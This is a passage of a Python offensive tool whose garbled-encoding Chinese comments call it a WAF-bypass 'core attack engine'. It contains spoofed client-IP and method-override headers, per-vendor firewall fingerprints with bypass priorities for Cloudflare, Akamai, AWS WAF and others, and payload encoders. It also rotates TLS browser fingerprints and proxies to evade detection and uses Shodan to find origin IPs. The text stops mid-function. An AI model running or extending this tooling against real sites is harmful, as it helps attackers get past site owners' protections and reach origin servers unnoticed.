
#!/usr/bin/env python3
"""
WAFç»•è¿‡
pip install aiohttp dnspython shodan mmh3
"""
import logging 
import asyncio
import ssl
import socket
import hashlib
import base64
import warnings
import time
import os
from functools import wraps
from typing import Any, Callable

# å¯¼å…¥é‡æ„åçš„ä»£ç†ç½‘å…³
try:
    from .dynamic_ip_pool import init_proxy_gateway, get_proxy_session, get_gateway_stats, force_switch_gateway
    PROXY_AVAILABLE = True
except ImportError:
    try:
        from dynamic_ip_pool import init_proxy_gateway, get_proxy_session, get_gateway_stats, force_switch_gateway
        PROXY_AVAILABLE = True
    except ImportError:
        PROXY_AVAILABLE = False
        print("[!] ä»£ç†ç½‘å…³æ¨¡å—æœªæ‰¾åˆ°ï¼Œå°†ä½¿ç”¨ç›´è¿æ¨¡å¼")

# æ ¸å¿ƒä¾èµ–æ£€æŸ¥
try:
    import aiohttp
except ImportError:
    print("[!] ç¼ºå°‘aiohttpåº“ï¼Œå®‰è£…: pip install aiohttp")
    raise

try:
    import aiohttp_socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[!] ç¼ºå°‘aiohttp_socksåº“ï¼Œä»£ç†SSLè¿æ¥å—é™: pip install aiohttp_socks")

try:
    import dns.resolver
except ImportError:
    print("[!] ç¼ºå°‘dnspythonåº“ï¼Œå®‰è£…: pip install dnspython")
    raise

# å°è¯•å¯¼å…¥mmh3ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä½¿ç”¨å¤‡ç”¨æ–¹æ¡ˆ
try:
    import mmh3
    HAS_MMH3 = True
except ImportError:
    HAS_MMH3 = False
    # ç®€å•çš„å¤‡ç”¨å“ˆå¸Œå‡½æ•°
    def mmh3_hash_fallback(data):
        return hash(data) & 0x7FFFFFFF  # è¿”å›æ­£æ•´æ•°
import urllib.parse
import json
import re
import time
import random
import difflib
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta
import ipaddress
from collections import defaultdict
import struct

# å°è¯•å¯¼å…¥å¯é€‰ä¾èµ–
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False
    print("[!] Shodanåº“æœªå®‰è£…ï¼Œéƒ¨åˆ†æºç«™å‘ç°åŠŸèƒ½å—é™")

# å°è¯•å¯¼å…¥tls-clientï¼ˆç»•è¿‡ç‡æå‡å…³é”®ï¼‰
try:
    import tls_client
    TLS_CLIENT_AVAILABLE = True
    print("[+] TLS-Clientå·²åŠ è½½ - ç»•è¿‡ç‡æå‡æ¨¡å¼å¯ç”¨!")
except ImportError:
    TLS_CLIENT_AVAILABLE = False
    print("[!] TLS-Clientåº“æœªå®‰è£…ï¼Œä½¿ç”¨ä¼ ç»Ÿæ–¹æ³• (pip install tls-client)")

@dataclass
class BypassResult:
    """ç»•è¿‡ç»“æœ"""
    success: bool
    method: str
    url: str
    details: Dict[str, Any] = field(default_factory=dict)
    confidence: float = 0.0
    risk_level: str = "medium"
    timestamp: datetime = field(default_factory=datetime.now)

@dataclass
class SmugglingResult:
    """HTTPè¯·æ±‚èµ°ç§æ‰«æç»“æœ"""
    vulnerable: bool = False
    technique: Optional[str] = None
    evidence: str = ""
    baseline_status: int = 0
    confirmation_status: int = 0
    baseline_time: float = 0.0
    confirmation_time: float = 0.0
    timestamp: datetime = field(default_factory=datetime.now)

@dataclass
class GraphQLResult:
    """GraphQLæ‰¹å¤„ç†æ¼æ´æ‰«æç»“æœ"""
    vulnerable: bool = False
    endpoint: Optional[str] = None
    evidence: str = ""
    successful_queries_in_batch: int = 0
    total_queries_in_batch: int = 0
    confidence: float = 0.0
    introspection_available: bool = False
    timestamp: datetime = field(default_factory=datetime.now)

@dataclass
class OriginServer:
    """æºç«™ä¿¡æ¯"""
    ip: str
    confidence: float
    discovery_method: str
    ports: List[int] = field(default_factory=list)
    services: Dict[str, str] = field(default_factory=dict)
    is_verified: bool = False

class _ConfidenceScorer:
    """
    ã€æ•°å­¦æ ¸å¿ƒã€‘
    åŸºäºå¤šç»´åº¦è¯æ®ï¼ŒåŠ¨æ€è¯„ä¼°ç»•è¿‡ç»“æœçš„ç½®ä¿¡åº¦ã€‚
    """
    def __init__(self):
        # 1. å®šä¹‰ä¸åŒç»•è¿‡æ–¹æ³•çš„åˆå§‹æƒé‡ï¼ˆåŸºç¡€åˆ†ï¼‰
        self.METHOD_WEIGHTS = {
            'direct_origin_enhanced': 0.95, # æºç«™ç›´è¿ï¼Œæœ€é«˜ç½®ä¿¡åº¦
            'http_smuggling_enhanced': 0.9,   # è¯·æ±‚èµ°ç§ï¼Œé«˜ç½®ä¿¡åº¦
            'graphql_batch_enhanced': 0.85,   # GraphQLæ‰¹å¤„ç†ï¼Œé«˜ç½®ä¿¡åº¦
            'websocket': 0.8,                 # WebSocket ç»•è¿‡
            'encoding_bypass_enhanced': 0.7,  # ç¼–ç ç»•è¿‡
            'header_manipulation_enhanced': 0.6, # å¤´éƒ¨æ“çºµ
            'method_override': 0.55,          # æ–¹æ³•è¦†ç›–
            'edge_cases': 0.5,                # è¾¹ç¼˜æ¡ˆä¾‹
            'default': 0.5                    # å…¶ä»–/æœªçŸ¥æ–¹æ³•
        }

    def _calculate_response_similarity(self, content_a: str, content_b: str) -> float:
        """è®¡ç®—ä¸¤ä¸ªé¡µé¢å†…å®¹çš„ç›¸ä¼¼åº¦ï¼Œè¿”å› 0.0 (å®Œå…¨ä¸åŒ) åˆ° 1.0 (å®Œå…¨ç›¸åŒ)"""
        if not content_a or not content_b:
            return 0.0
        return difflib.SequenceMatcher(None, content_a, content_b).ratio()

    def _calculate_content_quality(self, content: str) -> float:
        """è¯„ä¼°å“åº”å†…å®¹çš„è´¨é‡ï¼Œè¿”å› 0.0 (ä½è´¨é‡) åˆ° 1.0 (é«˜è´¨é‡)"""
        if not content or len(content) < 100:
            return 0.1 # å†…å®¹è¿‡çŸ­ï¼Œå¯èƒ½æ˜¯é”™è¯¯ä¿¡æ¯
        
        score = 0.3
        if '<html>' in content.lower(): score += 0.2
        if '<body>' in content.lower(): score += 0.2
        if '<title>' in content.lower(): score += 0.2
        if len(content) > 1000: score += 0.1
        
        return score

    def _check_waf_residue(self, content: str, headers: dict) -> float:
        """æ£€æŸ¥WAFç‰¹å¾æ®‹ç•™ï¼Œè¿”å›æƒ©ç½šåˆ†æ•° (0.0 åˆ° 1.0)"""
        # (è¿™ä¸ªå‡½æ•°å¯ä»¥å¤ç”¨ _fingerprint_waf_enhanced çš„é€»è¾‘)
        penalty = 0.0
        text_lower = content.lower()
        
        # ç¤ºä¾‹ï¼šæ£€æŸ¥Cloudflareæ®‹ç•™
        if 'cf-ray' in headers or 'cloudflare' in text_lower or '__cf_bm' in headers.get('Set-Cookie', ''):
            penalty = 0.5 # å¦‚æœè¿˜æœ‰Cloudflareç‰¹å¾ï¼Œè¯´æ˜æ²¡å®Œå…¨ç»•è¿‡
            
        return penalty

    def assess(self, bypass_result: BypassResult, waf_block_page_content: str = "") -> float:
        """
        ä¸»è¯„ä¼°æ–¹æ³•ï¼Œè®¡ç®—æœ€ç»ˆç½®ä¿¡åº¦åˆ†æ•°ã€‚
        """
        # 1. è·å–åˆå§‹æƒé‡
        initial_weight = self.METHOD_WEIGHTS.get(bypass_result.method, self.METHOD_WEIGHTS['default'])
        
        # 2. è®¡ç®—å“åº”ç›¸ä¼¼åº¦æƒ©ç½š
        # ç›¸ä¼¼åº¦è¶Šé«˜ï¼Œå¾—åˆ†è¶Šä½ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨ (1 - ç›¸ä¼¼åº¦)
        similarity_score = 1.0 - self._calculate_response_similarity(
            bypass_result.details.get('content', ''), 
            waf_block_page_content
        )
        
        # 3. è®¡ç®—å†…å®¹è´¨é‡å¾—åˆ†
        quality_score = self._calculate_content_quality(bypass_result.details.get('content', ''))
        
        # 4. è®¡ç®—WAFæ®‹ç•™æƒ©ç½š
        residue_penalty = self._check_waf_residue(
            bypass_result.details.get('content', ''),
            bypass_result.details.get('headers', {})
        )
        
        # æœ€ç»ˆå¾—åˆ†è®¡ç®— (åŠ æƒ & æƒ©ç½š)
        final_confidence = (initial_weight * 0.5 + 
                           similarity_score * 0.2 + 
                           quality_score * 0.3) - residue_penalty

        # ç¡®ä¿åˆ†æ•°åœ¨ 0.0 åˆ° 1.0 ä¹‹é—´
        return max(0.0, min(1.0, final_confidence))

class WAFBypasser:
    """WAFç»•è¿‡å™¨ - æ ¸å¿ƒæ”»å‡»å¼•æ“"""
    
    def __init__(self, shodan_api_key: str = None):
        # ã€æ–°å¢ã€‘è®¾ç½®æ—¥å¿—è®°å½•å™¨
        self.logger = logging.getLogger("WAFBypasser")
        if not self.logger.handlers:  # é˜²æ­¢é‡å¤æ·»åŠ handler
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - [%(levelname)s] - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # å¦‚æœæ²¡æœ‰æä¾›å¯†é’¥ï¼Œè‡ªåŠ¨ä»ç¯å¢ƒå˜é‡è¯»å–
        if shodan_api_key is None:
            shodan_api_key = os.environ.get('SHODAN_API_KEY')
        self.shodan_api_key = shodan_api_key
        self.shodan_client = None
        if SHODAN_AVAILABLE and shodan_api_key:
            try:
                self.shodan_client = shodan.Shodan(shodan_api_key)
                self.logger.info(f"[+] Shodan APIåˆå§‹åŒ–æˆåŠŸ: {shodan_api_key[:8]}...")
            except Exception as e:
                self.logger.error(f"[!] Shodan APIåˆå§‹åŒ–å¤±è´¥: {e}")
                self.shodan_client = None
        elif not SHODAN_AVAILABLE:
            self.logger.warning("[!] Shodanåº“æœªå®‰è£…ï¼Œé«˜çº§åŠŸèƒ½å—é™")
        elif not shodan_api_key:
            self.logger.warning("[!] æœªæä¾›Shodan APIå¯†é’¥ï¼Œéƒ¨åˆ†åŠŸèƒ½å—é™")
        
        # åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°å™¨
        self.scorer = _ConfidenceScorer()
        
        # ç»“æœç¼“å­˜ç³»ç»Ÿ
        self._cache = {
            'dns': {},      # DNSæŸ¥è¯¢ç¼“å­˜
            'jarm': {},     # JARMæŒ‡çº¹ç¼“å­˜
            'waf': {},      # WAFè¯†åˆ«ç¼“å­˜
            'ssl_san': {},  # SSLè¯ä¹¦ç¼“å­˜
            'favicon': {},  # Faviconå“ˆå¸Œç¼“å­˜
            'headers': {}   # å“åº”å¤´ç¼“å­˜
        }
        self._cache_ttl = 3600  # 1å°æ—¶è¿‡æœŸ
        self._cache_hits = 0
        self._cache_misses = 0
        
        # ç»•è¿‡è¯·æ±‚å¤´é›†åˆ
        self.bypass_headers = {
            # IPæ¬ºéª—å¤´
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Host': 'localhost',
            
            # æ–¹æ³•è¦†ç›–å¤´
            'X-HTTP-Method-Override': 'GET',
            'X-HTTP-Method': 'GET',
            'X-Method-Override': 'GET',
            
            # ç¼“å­˜ç»•è¿‡
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            
            # å…¶ä»–æœ‰ç”¨çš„å¤´
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Port': '443',
            'X-Frame-Options': 'SAMEORIGIN'
        }
        
        # WAFæŒ‡çº¹åº“
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['CF-RAY', 'CF-Cache-Status', 'cf-request-id'],
                'cookies': ['__cfduid', 'cf_clearance'],
                'errors': ['Attention Required!', 'cf-browser-verification', 'cloudflare'],
                'server': ['cloudflare'],
                'bypass_priority': ['origin_ip', 'websocket', 'graphql', 'cache_poison']
            },
            'akamai': {
                'headers': ['X-Akamai-Transformed', 'Akamai-Origin-Hop'],
                'cookies': ['akamai_'],
                'server': ['AkamaiGHost'],
                'bypass_priority': ['origin_ip', 'method_override', 'path_confusion']
            },
            'aws_waf': {
                'headers': ['X-AMZ-CF-ID', 'X-Amzn-Trace-Id'],
                'cookies': ['AWSALB'],
                'server': ['Amazon CloudFront'],
                'bypass_priority': ['json_smuggling', 'xml_entity', 'graphql_batch']
            },
            'sucuri': {
                'headers': ['X-Sucuri-ID', 'X-Sucuri-Cache'],
                'server': ['Sucuri/CloudProxy'],
                'bypass_priority': ['origin_ip', 'encoding_bypass']
            },
            'incapsula': {
                'headers': ['X-Iinfo', 'X-CDN'],
                'cookies': ['incap_ses_', 'visid_incap_'],
                'server': ['Incapsula'],
                'bypass_priority': ['origin_ip', 'javascript_bypass']
            },
            'f5_bigip': {
                'cookies': ['BIGipServer', 'F5-TrafficShield'],
                'headers': ['X-Cnection', 'X-F5-Auth-Token'],
                'bypass_priority': ['chunked_encoding', 'http_smuggling']
            },
            'barracuda': {
                'cookies': ['barra'],
                'server': ['Barracuda'],
                'bypass_priority': ['method_override', 'path_normalization']
            },
            'modsecurity': {
                'errors': ['ModSecurity', 'Mod_Security'],
                'server': ['Mod_Security'],
                'bypass_priority': ['encoding_bypass', 'comment_injection']
            }
        }
        
        # ç¼–ç å™¨é›†åˆ
        self.encoders = {
            'url': self._url_encode,
            'double_url': self._double_url_encode,
            'unicode': self._unicode_encode,
            'utf8_overlong': self._utf8_overlong_encode,
            'mixed_case': self._mixed_case_encode,
            'html_entity': self._html_entity_encode,
            'base64': self._base64_encode,
            'hex': self._hex_encode
        }
        
        # TLS-Client æµè§ˆå™¨é…ç½®æ–‡ä»¶ - 10ç§æŒ‡çº¹æè‡´ä¼˜åŒ–
        self.browser_profiles = {
            # ç°ä»£ä¸»æµæµè§ˆå™¨
            'chrome_120': {
                'identifier': 'chrome_120',
                'description': 'Chrome 120 - æœ€æ–°ChromeæŒ‡çº¹',
                'priority': 1,
                'category': 'modern'
            },
            'firefox_119': {
                'identifier': 'firefox_119', 
                'description': 'Firefox 119 - æœ€æ–°FirefoxæŒ‡çº¹',
                'priority': 2,
                'category': 'modern'
            },
            'safari_17': {
                'identifier': 'safari_17',
                'description': 'Safari 17 - macOSæŒ‡çº¹',
                'priority': 3,
                'category': 'modern'
            },
            'edge_120': {
                'identifier': 'edge_120',
                'description': 'Edge 120 - WindowsæŒ‡çº¹',
                'priority': 4,
                'category': 'modern'
            },
            'opera_105': {
                'identifier': 'opera_105',
                'description': 'Opera 105 - å°‘è§æŒ‡çº¹',
                'priority': 5,
                'category': 'modern'
            },
            
            # ç§»åŠ¨ç«¯æµè§ˆå™¨æŒ‡çº¹
            'chrome_android': {
                'identifier': 'chrome_android',
                'description': 'Chrome Android - ç§»åŠ¨ç«¯æŒ‡çº¹',
                'priority': 6,
                'category': 'mobile'
            },
            'safari_ios': {
                'identifier': 'safari_ios',
                'description': 'Safari iOS - iPhoneæŒ‡çº¹',
                'priority': 7,
                'category': 'mobile'
            },
            
            # ä¼ ç»Ÿ/æ—§ç‰ˆæµè§ˆå™¨ (ç»•è¿‡ç°ä»£æ£€æµ‹)
            'chrome_112': {
                'identifier': 'chrome_112',
                'description': 'Chrome 112 - æ—§ç‰ˆChromeæŒ‡çº¹',
                'priority': 8,
                'category': 'legacy'
            },
            'firefox_102': {
                'identifier': 'firefox_102',
                'description': 'Firefox 102 - æ—§ç‰ˆFirefoxæŒ‡çº¹',
                'priority': 9,
                'category': 'legacy'
            },
            
            # ç‰¹æ®Š/ç½•è§æµè§ˆå™¨ (ç»•è¿‡æŒ‡çº¹åº“)
            'okhttp': {
                'identifier': 'okhttp',
                'description': 'OkHttp - Androidåº”ç”¨å¸¸ç”¨',
                'priority': 10,
                'category': 'special'
            }
        }
        
        # åˆå§‹åŒ–TLS-Clientä¼šè¯
        self.tls_sessions = {}
        if TLS_CLIENT_AVAILABLE:
            self.logger.info("[*] åˆå§‹åŒ–TLS-Clientæµè§ˆå™¨æŒ‡çº¹...")
            for profile_name, profile_config in self.browser_profiles.items():
                try:
                    session = tls_client.Session(
                        client_identifier=profile_config['identifier'],
                        random_tls_extension_order=True
                    )
                    self.tls_sessions[profile_name] = session
                    self.logger.info(f"    [+] {profile_config['description']}")
                except Exception as e:
                    self.logger.error(f"    [!] {profile_name} åˆå§‹åŒ–å¤±è´¥: {e}")
        else:
            self.logger.warning("[!] TLS-Clientæœªå¯ç”¨ï¼Œä½¿ç”¨ä¼ ç»Ÿaiohttpæ–¹æ³•")
        
        # æŒ‡çº¹è½®æ¢æœºåˆ¶ - é˜²æ­¢è¢«WAFè¯†åˆ«
        self.profile_rotation = {
            'current_profile': 'chrome_120',
            'rotation_count': 0,
            'max_uses_per_profile': 3,  # æ¯ä¸ªæŒ‡çº¹æœ€å¤šç”¨3æ¬¡å°±è½®æ¢
            'blocked_profiles': set(),  # è¢«å°çš„æŒ‡çº¹
            'success_rates': defaultdict(float)  # å„æŒ‡çº¹æˆåŠŸç‡
        }
        
        # ç»Ÿè®¡ä¿¡æ¯
        self.stats = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'origin_ips_found': 0,
            'waf_types_encountered': set(),
            'tls_client_successes': 0,
            'traditional_method_successes': 0,
            'profile_usage': defaultdict(int),  # å„æŒ‡çº¹ä½¿ç”¨æ¬¡æ•°
            'profile_success': defaultdict(int)  # å„æŒ‡çº¹æˆåŠŸæ¬¡æ•°
        }


    async def _make_tls_request(self, url: str, headers: Dict = None, method: str = 'GET', 
                              profile: str = 'chrome_120', use_proxy: bool = False, **kwargs) -> Dict[str, Any]:
        """TLS-Clientå¼‚æ­¥åŒ…è£…å™¨ - æ ¸å¿ƒç»•è¿‡å¢å¼º"""
        if not TLS_CLIENT_AVAILABLE or profile not in self.tls_sessions:
            # å›é€€åˆ°ä¼ ç»Ÿæ–¹æ³•
            return await self._make_traditional_request(url, headers, method, use_proxy, **kwargs)
        
        try:
            # å‡†å¤‡è¯·æ±‚å‚æ•°
            request_headers = self.bypass_headers.copy()
            if headers:
                request_headers.update(headers)
            
            # ä½¿ç”¨ asyncio.to_thread åŒ…è£…åŒæ­¥è°ƒç”¨
            session = self.tls_sessions[profile]
            
            if method.upper() == 'GET':
                response = await asyncio.to_thread(
                    session.get,
                    url,
                    headers=request_headers,
                    timeout_seconds=30,
                    **kwargs
                )
            elif method.upper() == 'POST':
                response = await asyncio.to_thread(
                    session.post,
                    url,
                    headers=request_headers,
                    timeout_seconds=30,
                    **kwargs
                )
            elif method.upper() == 'TRACE':
                # TRACEæ–¹æ³•ä½¿ç”¨execute_request
                response = await asyncio.to_thread(
                    session.execute_request,
                    'TRACE',  # methodæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°
                    url,      # urlæ˜¯ç¬¬äºŒä¸ªå‚æ•°  
                    headers=request_headers,
                    timeout_seconds=30
                )
            else:
                # å…¶ä»–HTTPæ–¹æ³• - ç»Ÿä¸€ä½¿ç”¨execute_request
                method_lower = method.lower()
                
                # æ£€æŸ¥æ˜¯å¦æ˜¯æ”¯æŒçš„æ ‡å‡†æ–¹æ³•
                standard_methods = ['head', 'options', 'put', 'patch', 'delete']
                
                if method_lower in standard_methods and hasattr(session, method_lower):
                    # ä½¿ç”¨ä¸“ç”¨æ–¹æ³•
                    response = await asyncio.to_thread(
                        getattr(session, method_lower),
                        url,
                        headers=request_headers,
                        timeout_seconds=30,
                        **kwargs
                    )
                elif hasattr(session, 'execute_request'):
                    # ä½¿ç”¨é€šç”¨execute_requestæ–¹æ³•
                    response = await asyncio.to_thread(
                        session.execute_request,
                        method.upper(),  # methodæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°
                        url,            # urlæ˜¯ç¬¬äºŒä¸ªå‚æ•°
                        headers=request_headers,
                        timeout_seconds=30
                    )
                else:
                    self.logger.warning(f"[!] {method}æ–¹æ³•ä¸æ”¯æŒï¼Œè·³è¿‡æ­¤æ¢æµ‹")
                    raise AttributeError(f"{method} method not supported by tls_client")
            
            # ç»Ÿè®¡TLS-ClientæˆåŠŸ
            self.stats['tls_client_successes'] += 1
            
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'text': response.text,
                'content': response.content,
                'url': response.url,
                'method': 'tls_client',
                'profile': profile
            }
            
        except Exception as e:
            self.logger.warning(f"[!] TLS-Clientè¯·æ±‚å¤±è´¥ ({profile}): {e}")
            # å›é€€åˆ°ä¼ ç»Ÿæ–¹æ³•
            use_proxy = kwargs.pop('use_proxy', False)  # æå–ä»£ç†å‚æ•°
            return await self._make_traditional_request(url, headers, method, use_proxy, **kwargs)
    
    async def _make_traditional_request(self, url: str, headers: Dict = None, 
                                      method: str = 'GET', use_proxy: bool = False, **kwargs) -> Dict[str, Any]:
        """ä¼ ç»Ÿaiohttpè¯·æ±‚æ–¹æ³• - æ”¯æŒä»£ç†ç½‘å…³"""
        try:
            request_headers = self.bypass_headers.copy()
            if headers:
                request_headers.update(headers)
            
            # ä»£ç†æ¨¡å¼
            if use_proxy and PROXY_AVAILABLE:
                result = await get_proxy_session()
                if result:
                    session, proxy_url = result
                    try:
                        async with getattr(session, method.lower())(
                            url,
                            headers=request_headers,
                            ssl=False,
                            timeout=aiohttp.ClientTimeout(total=30),
                            proxy=proxy_url,  # ä½¿ç”¨ä»£ç†
                            **kwargs
                        ) as resp:
                            text = await resp.text()
                            content = await resp.read()
                            
                            self.stats['traditional_method_successes'] += 1
                            
                            return {
                                'status_code': resp.status,
                                'headers': dict(resp.headers),
                                'text': text,
                                'content': content,
                                'url': str(resp.url),
                                'method': 'aiohttp_proxy',
                                'profile': 'traditional_proxy',
                                'proxy_used': proxy_url
                            }
                    finally:
                        await session.close()
                else:
                    self.logger.warning("âš ï¸ æ— æ³•è·å–ä»£ç†ä¼šè¯ï¼Œå›é€€åˆ°ç›´è¿æ¨¡å¼")
            
            # ç›´è¿æ¨¡å¼ï¼ˆé»˜è®¤æˆ–ä»£ç†å¤±è´¥æ—¶çš„å¤‡ç”¨ï¼‰
            async with aiohttp.ClientSession() as session:
                async with getattr(session, method.lower())(
                    url,
                    headers=request_headers,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=30),
                    **kwargs
                ) as resp:
                    text = await resp.text()
                    content = await resp.read()
                    
                    self.stats['traditional_method_successes'] += 1
                    
                    return {
                        'status_code': resp.status,
                        'headers': dict(resp.headers),
                        'text': text,
                        'content': content,
                        'url': str(resp.url),
                        'method': 'aiohttp',
                        'profile': 'traditional'
                    }
        except Exception as e:
            # å¦‚æœæ˜¯ä»£ç†ç›¸å…³é”™è¯¯ï¼Œå°è¯•åˆ‡æ¢ä»£ç†
            if use_proxy and PROXY_AVAILABLE and any(proxy_error in str(e).lower() 
                                                    for proxy_error in ['proxy', 'connection', 'timeout']):
                self.logger.warning(f"âš ï¸ ä»£ç†è¯·æ±‚å¤±è´¥ï¼Œå¼ºåˆ¶åˆ‡æ¢ä»£ç†: {e}")
                force_switch_gateway()
            
            return {
                'status_code': 0,
                'headers': {},
                'text': '',
                'content': b'',
                'url': url,
                'method': 'failed',
                'error': str(e)
            }

    async def _get_target_fingerprint(self, url: str, use_proxy: bool = False) -> Dict[str, Any]:
        """è·å–ç›®æ ‡ç«™ç‚¹çš„ç‹¬ç‰¹æŒ‡çº¹ç”¨äºéªŒè¯ - ä½¿ç”¨TLS-Clientå¢å¼º"""
        fingerprint = {
            'title': None,
            'meta_keywords': None,
            'meta_description': None,
            'static_resources': [],
            'body_size_range': (0, 0),
            'unique_headers': {},
            'dom_patterns': []
        }
        
        try:
            # ä¼˜å…ˆä½¿ç”¨TLS-Clientè·å–æŒ‡çº¹
            resp = await self._make_tls_request(url, profile='chrome_120', use_proxy=use_proxy)
            
            if resp['status_code'] == 200:
                content = resp['text']
                
                # æå–é¡µé¢æ ‡é¢˜
                import re
                title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE)
                if title_match:
                    fingerprint['title'] = title_match.group(1).strip()
                
                # æå–metaæ ‡ç­¾
                meta_keywords = re.search(r'<meta\s+name=["\']keywords["\']\s+content=["\'](.*?)["\']', content, re.IGNORECASE)
                if meta_keywords:
                    fingerprint['meta_keywords'] = meta_keywords.group(1)
                
                meta_desc = re.search(r'<meta\s+name=["\']description["\']\s+content=["\'](.*?)["\']', content, re.IGNORECASE)
                if meta_desc:
                    fingerprint['meta_description'] = meta_desc.group(1)
                
                # æå–é™æ€èµ„æº
                js_files = re.findall(r'<script[^>]+src=["\'](/[^"\']+\.js[^"\']*)["\']', content)
                css_files = re.findall(r'<link[^>]+href=["\'](/[^"\']+\.css[^"\']*)["\']', content)
                fingerprint['static_resources'] = list(set(js_files[:5] + css_files[:5]))
                
                # å“åº”å¤§å°èŒƒå›´ï¼ˆÂ±30%ï¼‰
                body_size = len(content)
                fingerprint['body_size_range'] = (int(body_size * 0.7), int(body_size * 1.3))
                
                # ç‹¬ç‰¹å“åº”å¤´
                for header, value in resp['headers'].items():
                    if header.lower() not in ['date', 'content-length', 'connection', 'server']:
                        fingerprint['unique_headers'][header] = value
                
                # DOMæ¨¡å¼ï¼ˆæ£€æŸ¥ç‰¹å®šclassæˆ–idï¼‰
                unique_ids = re.findall(r'id=["\']([\w\-]+)["\']', content)[:5]
                unique_classes = re.findall(r'class=["\']([\w\-\s]+)["\']', content)[:5]
                fingerprint['dom_patterns'] = list(set(unique_ids + unique_classes))
                
                self.logger.info(f"[+] ç›®æ ‡æŒ‡çº¹è·å–æˆåŠŸ (ä½¿ç”¨: {resp['method']}-{resp['profile']})")
            else:
                self.logger.warning(f"[!] ç›®æ ‡æŒ‡çº¹è·å–å¤±è´¥: HTTP {resp['status_code']}")
                    
        except Exception as e:
            self.logger.error(f"[!] è·å–ç›®æ ‡æŒ‡çº¹å¤±è´¥: {e}")
        
        self._target_fingerprint = fingerprint
        return fingerprint


    async def auto_bypass(self, target_url: str, aggressive: bool = False, use_proxy: bool = False) -> Dict[str, Any]:
        """æ™ºèƒ½è‡ªåŠ¨ç»•è¿‡ - æ ¸å¿ƒæ–¹æ³• (TLS-Clientå¢å¼ºç‰ˆ + ä»£ç†ç½‘å…³)"""
        self.stats['total_attempts'] += 1
        
        # æ£€æŸ¥ä»£ç†ç½‘å…³çŠ¶æ€ï¼ˆä¸»ç¨‹åºå¯èƒ½å·²ç»åˆå§‹åŒ–è¿‡äº†ï¼‰
        if use_proxy and PROXY_AVAILABLE:
            # æ£€æŸ¥ä»£ç†ç½‘å…³æ˜¯å¦å·²ç»å¯ç”¨
            try:
                stats = get_gateway_stats()
                if stats.get('æ€»ç½‘å…³æ•°', 0) > 0:
                    self.logger.info(f"ğŸš€ ä»£ç†ç½‘å…³å·²å°±ç»ª (ç½‘å…³æ•°: {stats['æ€»ç½‘å…³æ•°']})")
                else:
                    self.logger.info("ğŸš€ åˆå§‹åŒ–ä»£ç†ç½‘å…³...")
                    if not init_proxy_gateway():
                        self.logger.warning("âš ï¸ ä»£ç†ç½‘å…³åˆå§‹åŒ–å¤±è´¥ï¼Œå°†ä½¿ç”¨ç›´è¿æ¨¡å¼")
                        use_proxy = False
                    else:
                        self.logger.info("âœ… ä»£ç†ç½‘å…³å°±ç»ª")
            except:
                self.logger.warning("âš ï¸ ä»£ç†ç½‘å…³æ£€æŸ¥å¤±è´¥ï¼Œä½¿ç”¨ç›´è¿æ¨¡å¼")
                use_proxy = False
        
        results = {
            'target': target_url,
            'waf_detected': None,
            'origin_servers': [],
            'successful_bypasses': [],
            'failed_attempts': [],
            'recommendations': [],
            'tls_profiles_tested': [],
            'proxy_enabled': use_proxy,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            # æ–°å¢ï¼šé¦–å…ˆè·å–ç›®æ ‡æŒ‡çº¹
            fingerprint_method = "(TLS-Clientå¢å¼º + ä»£ç†ç½‘å…³)" if use_proxy else "(TLS-Clientå¢å¼º)"
            self.logger.info(f"\n[*] è·å–ç›®æ ‡ç«™ç‚¹æŒ‡çº¹ {fingerprint_method}...")
            await self._get_target_fingerprint(target_url, use_proxy=use_proxy)
            
            # 1. WAFæŒ‡çº¹è¯†åˆ« - ä½¿ç”¨å¤šæµè§ˆå™¨æŒ‡çº¹
            self.logger.info(f"\n[*] å¼€å§‹WAFç»•è¿‡åˆ†æ: {target_url}")
            waf_type = await self._fingerprint_waf_enhanced(target_url, use_proxy=use_proxy)
            results['waf_detected'] = waf_type
            
            if waf_type:
                self.stats['waf_types_encountered'].add(waf_type)
                self.logger.info(f"[+] æ£€æµ‹åˆ°WAFç±»å‹: {waf_type}")
            else:
                self.logger.warning("[!] æœªæ£€æµ‹åˆ°æ˜æ˜¾çš„WAFç‰¹å¾")
            
            # 2. æºç«™å‘ç°
            discovery_method = "(ä»£ç†ç½‘å…³æ¨¡å¼)" if use_proxy else "(ç›´è¿æ¨¡å¼)"
            self.logger.info(f"\n[*] å°è¯•å‘ç°æºç«™IP {discovery_method}...")
            origin_servers = await self._discover_origin_comprehensive(target_url, use_proxy=use_proxy)
            results['origin_servers'] = [
                {
                    'ip': server.ip,
                    'confidence': server.confidence,
                    'method': server.discovery_method,
                    'verified': server.is_verified
                }
                for server in origin_servers
            ]
            
            if origin_servers:
                self.stats['origin_ips_found'] += len(origin_servers)
                self.logger.info(f"[+] å‘ç° {len(origin_servers)} ä¸ªæ½œåœ¨æºç«™IP")
            
            # ====================================================================
            # ã€æ ¸å¿ƒä¿®æ­£ã€‘å°†å¤æ‚çš„æ‰«æå™¨ä»ç­–ç•¥å¾ªç¯ä¸­ç§»å‡ºï¼Œåªæ‰§è¡Œä¸€æ¬¡
            # ====================================================================
            
